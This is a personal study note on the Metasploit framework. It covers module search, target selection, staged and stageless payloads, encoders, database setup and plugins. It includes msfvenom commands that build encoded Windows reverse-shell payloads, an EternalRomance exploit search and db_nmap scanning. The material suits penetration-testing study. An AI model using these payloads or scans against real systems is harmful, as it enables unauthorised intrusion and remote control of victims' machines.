- [ ] Modules
```
Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. 

The exploit category consists of so-called proof-of-concept (POCs) that can be used to exploit existing vulnerabilities in a largely automated manner.
```
![[Pasted image 20250621100749.png]]
```
1-type: The Type tag is the first level of segregation between the Metasploit modules.

2-os: The OS tag specifies which operating system and architecture the module was created for.

3-service: The Service tag refers to the vulnerable service that is running on the target machine.
```
![[Pasted image 20250621100958.png]]
Searching for Modules!!!
```sh
search eternalromance
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
# use
user ID (Auxilliary | Exploits | Post)
use <type>/<os>/<service>/<name>
# doc
info
```
- [ ] Targets
![[Pasted image 20250621105005.png]]
```sh
# show targets in a select exploit module
show targets
# Selecting a Target
set target ID
# target type
msfpescan
```
Target Types!!!
![[Pasted image 20250621105335.png]]
- [ ] Payloads
![[Pasted image 20250621105454.png]]
```
single: These payloads contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one.

stager: These payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host.

stage: Stages are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others.

Ex:
`windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).
```
Staged Payloads!!!
![[Pasted image 20250621111051.png]]
```
The Stage0 of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service to make a connexion back to the attacker

As a Metasploit user, we will meet these under the common names `reverse_tcp`, `reverse_https`, and `bind_tcp`.

stage0 = The stager
stage1 = The stage

1-MSF - Staged Payloads

2-Meterpreter Payload
The Meterpreter payload is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes.

Scripts can be loaded or unloaded dynamicaly on meterpreter sessions ...
```
![[Pasted image 20250621111307.png]]
Stageless Payloads!!!
```
All in one payloads!!!!
```
Searching Payloads!!!
```sh
show payloads
grep meterpreter show payloads
msfvenom -l payloads 
```
Using Payloads!!!
```sh
# for the exploit
RHOST  RPORT
# for the payload
LHOST LPORT
```
Common Windows Payload!!!
![[Pasted image 20250621110739.png]]
- [ ] Encoders
![[Pasted image 20250622204611.png]]
Selecting an Encoder!!!
```sh
# Before 2015 msfpayload msfencode
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
# After 2015 msfvenom
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai -i 10
# msfconsole
set payload 15
show encoders
set encoder x64/zutto_dekiru 
```
- [ ] Database
![[Pasted image 20250622213054.png]]
Setting up the Database!!!!
```sh
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
sudo msfdb run
# Reinitiate the Database
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
msf6> db_status
```
Using the Database!!!
```sh
# workspaces
workspace # default workspace
workspace -a Target_1
workspace Target_1
workspace -h
# nmap
db_import Target.xml
db_nmap -sV -sS 10.10.10.8
# data backup
db_export -h
db_export -f xml backup.xml
```
Data retention commands!!!
```sh
# hosts
hosts -h 
# services
services -h
# credentials
creds -h
# loot
loot -h
```
- [ ] Plugins and Mixins
Plugins!!!
![[Pasted image 20250622214739.png]]
Using Plugins!!!!
```sh
ls /usr/share/metasploit-framework/plugins
load nessus
load Plugin_That_Does_Not_Exist
# install a custom plugin
git clone https://github.com/darkoperator/Metasploit-Plugins
cd Metasploit-Plugins
cp ./pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
msfconsole -q
msf6 > load pentest
```
Mixins!!!!
![[Pasted image 20250622215210.png]]